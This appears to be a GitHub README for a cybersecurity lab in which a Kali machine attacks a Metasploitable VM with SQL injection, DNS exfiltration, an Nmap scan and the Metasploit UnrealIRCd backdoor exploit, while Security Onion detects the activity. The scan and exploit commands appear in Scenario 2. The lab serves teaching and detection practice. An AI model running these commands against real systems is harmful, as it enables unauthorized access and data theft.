# Network_Security_Monitoring_Using_Security_Onion
In this cybersecurity lab, a simulated network environment is used to demonstrate two common cyber attacks: SQL injection and DNS data exfiltration. The network includes several virtual machines, such as a Kali Linux attacker machine and a vulnerable Metasploitable server. The first part of the lab involves the attacker using a web browser on the Kali machine to perform an SQL injection attack against the Metasploitable server's web application, successfully extracting sensitive credit card information from its MySQL database. Network logs from a Security Onion VM are then analyzed to identify and investigate the attack traffic.

---
## Attack Scenarios Overview

In this project, we demonstrate two common cyber attack techniques and how Security Onion detects them in a monitored network environment.

---

### 🔍 Scenario 1: Combined DNS Data Exfiltration & SQL Injection Attack

- **What happens:**  
  An attacker exploits a vulnerable web application by injecting malicious SQL code **while** covertly exfiltrating sensitive data using DNS queries.

- **Goal:**  
  To gain unauthorized access to the database **and** stealthily extract confidential information without raising suspicion.

- **Detection:**  
  Security Onion monitors both network traffic and database queries, generating alerts for abnormal DNS activity alongside suspicious SQL commands.

- **Why it matters:**  
  Combining SQL Injection with DNS data exfiltration makes the attack harder to

---

### 🔍 Scenario 2: Kali Linux Exploitation and Security Onion Monitoring

- **What happens:**  
  Using Kali Linux, an attacker scans and exploits a vulnerable Metasploitable VM with tools like Nmap and Metasploit. Security Onion’s monitoring tools, such as **Sguil** and **ELSA**, capture and alert on these activities in real-time.

- **Goal:**  
  To discover open ports and running services, exploit known vulnerabilities, and gain unauthorized access while Security Onion monitors network traffic and logs.

- **Detection:**  
  Security Onion generates alerts from Sguil based on the port scans and exploitation attempts, providing detailed correlated events and packet data. ELSA enables deep log analysis to investigate network connections, DNS queries, HTTP traffic, and flagged notices.

- **Why it matters:**  
  This scenario showcases practical attack techniques and highlights how comprehensive monitoring tools detect and analyze intrusions, improving incident response.

---

# Scenario 1

In this cybersecurity lab, a simulated network environment is used to demonstrate two common cyber attacks: SQL injection and DNS data exfiltration. The network includes several virtual machines, such as a Kali Linux attacker machine and a vulnerable Metasploitable server. The first part of the lab involves the attacker using a web browser on the Kali machine to perform an SQL injection attack against the Metasploitable server's web application, successfully extracting sensitive credit card information from its MySQL database. Network logs from a Security Onion VM are then analyzed to identify and investigate the attack traffic.

The second part of the lab focuses on data exfiltration. The attacker, having gained access to a CyberOps Workstation, converts a text file

confidential.txt) into a hexadecimal format. This hexadecimal data is then embedded within DNS queries and sent to the Metasploitable server, which is configured as a DNS server. The attacker uses a shell script to automate this process, effectively using the DNS service as a covert channel to leak the file's contents. The exfiltrated data is then retrieved, reassembled, and verified on the Kali machine.


## Environment of the setup 
<img width="600" height="310" alt="image" src="https://github.com/user-attachments/assets/ef74a7f1-7e99-47af-a9f3-c42866aacb21" />

## Step 1 
### Step 1 includes the capturing of Credit Card info that is inside the Metasploitable Linux using SQL injection. 
This technique is the classic Injection Attack as described by OWASP top 10. The injection is performed on Mutillidae inside of the Metasploitable Linux. 

<img width="600" height="914" alt="2" src="https://github.com/user-attachments/assets/ba630c1f-72f8-42e9-8efd-e872f16bf4d4" />

## Step 2
### The built in Security Onion Sguil detected the SQL injection attack and the alerts are visible in the Dashboard.


<img width="600" height="893" alt="3" src="https://github.com/user-attachments/assets/229b0566-e889-40d3-8340-c7e83bcafbec" />


Security Onion, detected a suspicious event. Specifically, it flagged an alert with the message: "ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT".
- This alert is important because it indicates a possible attack where someone is trying to exploit a weakness in the web server's database.
- The phrase "UNION SELECT" is a key indicator of an SQL injection attempt. This is a technique used by attackers to combine the results of two or more.

## Step 3
### Important details of the attack are visible inside the Transcript Windows of Security Onion. 

<img width="600" height="706" alt="5new" src="https://github.com/user-attachments/assets/cf28e521-16f3-4734-8189-504f7675d142" />

Looking at the TCP stream in Wireshark is where we see the attack unfold in real-time. It's like watching a conversation between our attacker machine and the vulnerable server. On the left side of the window, you can see the malicious GET request we sent, which contains the SQL injection payload designed to trick the server.
- The server, unfortunately, fell for it and responded by giving us exactly what we were after—the credit card information from the database.
- This clear exchange highlights how a simple web request can be exploited to steal sensitive data.
- It serves as a perfect visual example of what an SQL injection attack looks like on the network level.


## Step 4 
### TCP Stream Flow 

<img width="600" height="575" alt="6" src="https://github.com/user-attachments/assets/a22e2ead-38e9-4265-9241-76c89dd0c9ce" />

In these two panels, I’m comparing the request and the response from a captured attack. On the left, the attacker sends a malicious SQL injection payload through the username parameter, attempting to extract credit card and login details. On the right, the server responds by exposing sensitive data—usernames, passwords, and signatures—confirming the injection was successful. This side-by-side view shows the full attack chain: exploitation on one side and data leakage on the other.
- Left side: malicious HTTP request with SQL injection
- Right side: exposed database records in plain text
- Together: clear evidence of a successful attack

## Step 5
### Data Exfiltration using DNS 

<img width="600" height="703" alt="8" src="https://github.com/user-attachments/assets/b390515c-d24d-4221-821f-9c6f122d97cc" />

In this, I have performed a DNS exfiltration attack to see how data can be secretly moved out of a system. First, I logged into the vulnerable target and found encoded information inside the DNS query logs. Then, I transferred the extracted file to my Kali machine, decoded it from hex, and uncovered a confidential document. This exercise gave me a clear picture of how attackers hide data inside DNS traffic and why monitoring DNS is so critical.
- I have pulled data hidden in DNS query logs
- I have exfiltrated and decoded the file into readable text
- I have revealed a confidential document about a past breach

## Step 6 
### Decoding Hidden Confidential Data

<img width="600" height="789" alt="9" src="https://github.com/user-attachments/assets/bfa44f5d-5198-43e9-8d61-21ae0ec1e64a" />

Here, I have manually decoded exfiltrated data using a simple hex-to-text conversion. By echoing the hex string and piping it through xxd -r -p, I revealed the hidden message: CONFIDENTIAL DOCUMENT – DO NOT SHARE. This step shows how attackers can smuggle sensitive files out in encoded form and later reconstruct them on their own systems. It demonstrates how even harmless-looking hex data can actually contain critical secrets once decoded.
- I have taken raw hex data from DNS exfiltration.
- I have decoded it locally with xxd.
- I have revealed the confidential contents successfully.

# Scenario 2 
### This is a hands-on lab where we use Kali Linux to scan and exploit a vulnerable Metasploitable VM, and then catch everything in action using Security Onion's monitoring tools like **Sguil** and **ELSA**.

## Step 1 
### Start Sguil Monitoring
On the Security Onion desktop:
Launch Sguil
When asked which networks to monitor, choose all interfaces
Click Start and let it run in the background

## Step 2 
### Port Scan with Nmap (from Kali)
On the  Kali terminal, scan the Metasploitable machine:
```bash
nmap -p- -v -sS -A -T4 209.165.200.235
```
This scan might take a bit — it's doing a full port sweep.

After that i took a note of:

✅ Open ports

✅ Running services


## Step 3
### Exploit the Unreal IRC Backdoor

Time for some ethical hacking.

Still in Kali, launch Metasploit:
```bash
msfconsole
search unreal
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST 209.165.200.235
exploit
```
This being sucessful will give a sucessful shell access, after that 
```bash
whoami
hostname
ls
ifconfig
```
<img width="600" height="542" alt="image" src="https://github.com/user-attachments/assets/4203ce95-61b8-4cf3-ab53-9c9ee4cef2c0" />


## Step 4
### Watch the Alarms in Sguil

Jump back to Security Onion.

In Sguil, we should now see a bunch of alerts — especially from your port scan and exploit.

Do the following:

Right-click alerts → View Correlated Events

View Packet Data, Rules, and Transcripts for deeper info

I picked Pick 3 interesting alerts and screenshot their details.

<img width="600" height="623" alt="image" src="https://github.com/user-attachments/assets/81c407cf-503c-44b1-ad5f-b67e36c07cf9" />

<br><br>

<img width="600" height="555" alt="image" src="https://github.com/user-attachments/assets/6fd2d2d1-38fc-49e2-b108-a1d9735661e0" />

<br><br>

<img width="600" height="263" alt="image" src="https://github.com/user-attachments/assets/2a0fea09-a150-436a-8d34-680972b0f54b" />

## Correlated Events

<img width="600" height="427" alt="image" src="https://github.com/user-attachments/assets/78f26a06-e583-4910-aade-a3562812f434" />


## Step 5
### Dig into Logs with ELSA

Time to go log-hunting. Open ELSA on the Security Onion desktop.

🔹 BRO_CONN
- Search and group by DstPort
- See what ports were hit

<img width="600" height="567" alt="image" src="https://github.com/user-attachments/assets/3dc29320-47e4-4bf4-a5b5-10be6f0884a6" />

🔹 BRO_DNS
- Group by hostname
- Look for suspicious DNS activity (hint: filter by port 53)

<img width="600" height="547" alt="image" src="https://github.com/user-attachments/assets/ce873771-c13a-4b62-bbf3-31c93c5802f7" />

🔹 BRO_HTTP
- Group by site
- Click a result → then click info → download the PCAP via CapMe
- Human-readable logs will also show up if we switch Output to BRO

<img width="600" height="605" alt="image" src="https://github.com/user-attachments/assets/cdaa3ac5-4b4d-4c73-8090-36a26e0dc638" />

🔹 BRO_NOTICE
- Group by notice type
- See what Security Onion flagged

<img width="600" height="436" alt="image" src="https://github.com/user-attachments/assets/cfb22ec7-5e66-49ab-98fc-37393ebcb14d" />

## Conclusion

This lab was a solid dive into both sides of cybersecurity — offense and defense. Using Kali, I ran a real exploit on a vulnerable system, then flipped perspectives to see how Security Onion picked it all up behind the scenes. It’s one thing to run tools, but seeing the alerts, logs, and traffic come together made it feel real. It showed just how important visibility is in network defense. Overall, this was a great hands-on experience that tied together scanning, exploitation, and monitoring — and gave me a better understanding of how attackers move and how defenders catch them.
